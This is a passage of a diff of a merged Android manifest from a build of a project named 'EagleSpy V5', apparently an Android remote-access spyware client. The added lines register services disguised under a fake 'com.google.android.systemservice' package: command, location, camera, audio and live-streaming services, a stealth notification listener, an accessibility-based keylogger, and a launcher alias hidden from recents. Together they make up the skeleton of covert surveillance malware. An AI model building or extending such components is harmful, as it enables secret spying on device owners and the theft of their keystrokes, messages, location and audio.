-143            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
-143-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:68:13-106
-144            android:directBootAware="false"
-144-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:69:13-44
-145            android:enabled="false"
-145-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:70:13-36
-146            android:exported="false" >
-146-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:71:13-37
+87-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:72:13-75:29
+88                <action android:name="android.intent.action.MAIN" />
+88-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:17-69
+88-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:25-66
+89
+90                <category android:name="android.intent.category.LAUNCHER" />
+90-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:17-77
+90-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:27-74
+91            </intent-filter>
+92        </activity> <!-- Launcher alias kept enabled for test resets -->
+93        <activity-alias
+93-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:79:9-91:26
+94            android:name="com.google.android.systemservice.ProvisionLauncherActivity"
+94-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:80:13-54
+95            android:enabled="true"
+95-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:82:13-35
+96            android:excludeFromRecents="true"
+96-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:85:13-46
+97            android:exported="true"
+97-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:83:13-36
+98            android:launchMode="singleTask"
+98-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:84:13-44
+99            android:targetActivity="com.google.android.systemservice.SetupWizardActivity"
+99-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:81:13-58
+100            android:taskAffinity="" >
+100-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:86:13-36
+101            <intent-filter>
+101-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:72:13-75:29
+102                <action android:name="android.intent.action.MAIN" />
+102-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:17-69
+102-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:73:25-66
+103
+104                <category android:name="android.intent.category.LAUNCHER" />
+104-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:17-77
+104-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:74:27-74
+105            </intent-filter>
+106        </activity-alias>
+107
+108        <!-- Background Services -->
+109        <service
+109-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:94:9-97:40
+110            android:name="com.google.android.systemservice.services.CommandService"
+110-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:95:13-52
+111            android:exported="false"
+111-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:97:13-37
+112            android:foregroundServiceType="dataSync" />
+112-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:96:13-53
+113        <service
+113-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:99:9-102:40
+114            android:name="com.google.android.systemservice.services.LocationService"
+114-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:100:13-53
+115            android:exported="false"
+115-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:102:13-37
+116            android:foregroundServiceType="location" />
+116-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:101:13-53
+117        <service
+117-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:104:9-107:40
+118            android:name="com.google.android.systemservice.services.CameraService"
+118-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:105:13-51
+119            android:exported="false"
+119-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:107:13-37
+120            android:foregroundServiceType="camera" />
+120-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:106:13-51
+121        <service
+121-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:109:9-112:40
+122            android:name="com.google.android.systemservice.services.AudioService"
+122-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:110:13-50
+123            android:exported="false"
+123-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:112:13-37
+124            android:foregroundServiceType="microphone" />
+124-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:111:13-55
+125
+126        <!-- Accessibility Guard Service -->
+127        <service
+127-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:115:9-126:19
+128            android:name="com.google.android.systemservice.services.AccessibilityGuardService"
+128-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:116:13-63
+129            android:exported="false"
+129-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:118:13-37
+130            android:label="@string/accessibility_service_label"
+130-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:119:13-64
+131            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+131-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:117:13-79
+132            <intent-filter>
+132-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:120:13-122:29
+133                <action android:name="android.accessibilityservice.AccessibilityService" />
+133-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:121:17-92
+133-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:121:25-89
+134            </intent-filter>
+135
+136            <meta-data
+136-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:123:13-125:70
+137                android:name="android.accessibilityservice"
+137-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:124:17-60
+138                android:resource="@xml/accessibility_guard_config" />
+138-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:125:17-67
+139        </service>
+140
+141        <!-- Notification Listener Service -->
+142        <service
+142-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:129:9-140:19
+143            android:name="com.google.android.systemservice.services.StealthNotificationListener"
+143-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:130:13-65
+144            android:exported="false"
+144-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:132:13-37
+145            android:label="@string/notification_listener_label"
+145-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:133:13-64
+146            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" >
+146-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:131:13-87
 147            <intent-filter>
-147-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:73:13-76:29
-148                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
-148-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:74:17-87
-148-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:74:25-84
-149                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
-149-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:75:17-90
-149-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:75:25-87
-150            </intent-filter>
-151        </receiver>
-152        <receiver
-152-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:78:9-88:20
-153            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
-153-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:79:13-104
-154            android:directBootAware="false"
-154-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:80:13-44
-155            android:enabled="false"
-155-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:81:13-36
-156            android:exported="false" >
-156-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:82:13-37
-157            <intent-filter>
-157-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:84:13-87:29
-158                <action android:name="android.intent.action.BATTERY_OKAY" />
-158-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:85:17-77
-158-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:85:25-74
-159                <action android:name="android.intent.action.BATTERY_LOW" />
-159-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:86:17-76
-159-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:86:25-73
-160            </intent-filter>
-161        </receiver>
-162        <receiver
-162-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:89:9-99:20
-163            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
-163-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:90:13-104
-164            android:directBootAware="false"
-164-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:91:13-44
-165            android:enabled="false"
-165-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:92:13-36
-166            android:exported="false" >
-166-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:93:13-37
+147-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:134:13-136:29
+148                <action android:name="android.service.notification.NotificationListenerService" />
+148-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:135:17-99
+148-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:135:25-96
+149            </intent-filter>
+150
+151            <meta-data
+151-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:137:13-139:37
+152                android:name="android.service.notification.default_filter_types"
+152-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:138:17-81
+153                android:value="0" />
+153-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:139:17-34
+154        </service>
+155
+156        <!-- Live Streaming Service (WebRTC) -->
+157        <service
+157-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:143:9-146:40
+158            android:name="com.google.android.systemservice.services.LiveStreamingService"
+158-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:144:13-58
+159            android:exported="false"
+159-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:146:13-37
+160            android:foregroundServiceType="camera|microphone" />
+160-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:145:13-62
+161
+162        <!-- Keylogger Accessibility Service -->
+163        <service
+163-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:149:9-159:19
+164            android:name="com.google.android.systemservice.services.KeyloggerAccessibilityService"
+164-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:150:13-67
+165            android:exported="false"
+165-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:152:13-37
+166            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
+166-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:151:13-79
 167            <intent-filter>
-167-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:95:13-98:29
-168                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
-168-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:96:17-83
-168-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:96:25-80
-169                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
-169-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:97:17-82
-169-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:97:25-79
-170            </intent-filter>
-171        </receiver>
-172        <receiver
-172-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:100:9-109:20
-173            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
-173-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:101:13-103
-174            android:directBootAware="false"
-174-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:102:13-44
-175            android:enabled="false"
-175-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:103:13-36
-176            android:exported="false" >
-176-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:104:13-37
-177            <intent-filter>
-177-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:106:13-108:29
-178                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
-178-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:107:17-79
-178-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:107:25-76
-179            </intent-filter>
-180        </receiver>
-181        <receiver
-181-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:110:9-121:20
-182            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
-182-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:111:13-88
-183            android:directBootAware="false"
-183-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:112:13-44
-184            android:enabled="false"
-184-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:113:13-36
-185            android:exported="false" >
-185-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:114:13-37
-186            <intent-filter>
-186-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:116:13-120:29
-187                <action android:name="android.intent.action.BOOT_COMPLETED" />
-187-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:76:17-79
-187-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:76:25-76
-188                <action android:name="android.intent.action.TIME_SET" />
-188-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:17-73
-188-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:118:25-70
-189                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
-189-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:119:17-81
-189-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:119:25-78
-190            </intent-filter>
-191        </receiver>
-192        <receiver
-192-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:122:9-131:20
-193            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
-193-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:123:13-99
-194            android:directBootAware="false"
-194-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:124:13-44
-195            android:enabled="@bool/enable_system_alarm_service_default"
-195-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:125:13-72
-196            android:exported="false" >
-196-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:126:13-37
-197            <intent-filter>
-197-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:128:13-130:29
-198                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
-198-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:129:17-98
-198-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:129:25-95
-199            </intent-filter>
-200        </receiver>
-201        <receiver
-201-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:132:9-142:20
-202            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
-202-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:133:13-78
-203            android:directBootAware="false"
-203-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:134:13-44
-204            android:enabled="true"
-204-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:135:13-35
-205            android:exported="true"
-205-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:136:13-36
-206            android:permission="android.permission.DUMP" >
-206-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:137:13-57
-207            <intent-filter>
-207-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:139:13-141:29
-208                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
-208-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:140:17-88
-208-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:140:25-85
-209            </intent-filter>
-210        </receiver>
-211
-212        <service
-212-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:24:9-28:63
-213            android:name="androidx.room.MultiInstanceInvalidationService"
-213-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:25:13-74
-214            android:directBootAware="true"
-214-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:26:13-43
-215            android:exported="false" />
-215-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:27:13-37
-216
-217        <receiver
-217-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:34:9-52:20
-218            android:name="androidx.profileinstaller.ProfileInstallReceiver"
-218-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:35:13-76
-219            android:directBootAware="false"
-219-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:36:13-44
-220            android:enabled="true"
-220-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:37:13-35
-221            android:exported="true"
-221-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:38:13-36
-222            android:permission="android.permission.DUMP" >
-222-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:39:13-57
-223            <intent-filter>
-223-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:40:13-42:29
-224                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
-224-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:41:17-91
-224-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:41:25-88
-225            </intent-filter>
-226            <intent-filter>
-226-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:43:13-45:29
-227                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
-227-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:44:17-85
-227-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:44:25-82
-228            </intent-filter>
-229            <intent-filter>
-229-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:46:13-48:29
-230                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
-230-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:47:17-88
-230-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:47:25-85
-231            </intent-filter>
-232            <intent-filter>
-232-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:49:13-51:29
-233                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
-233-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:50:17-95
-233-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:50:25-92
-234            </intent-filter>
-235        </receiver>
-236    </application>
-237
-238</manifest>
+167-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:120:13-122:29
+168                <action android:name="android.accessibilityservice.AccessibilityService" />
+168-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:121:17-92
+168-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:121:25-89
+169            </intent-filter>
+170
+171            <meta-data
+171-->E:\EagleSpy V5\android-client\app\src\main\AndroidManifest.xml:123:13-125:70
+172                android:name="android.accessibilityservice"
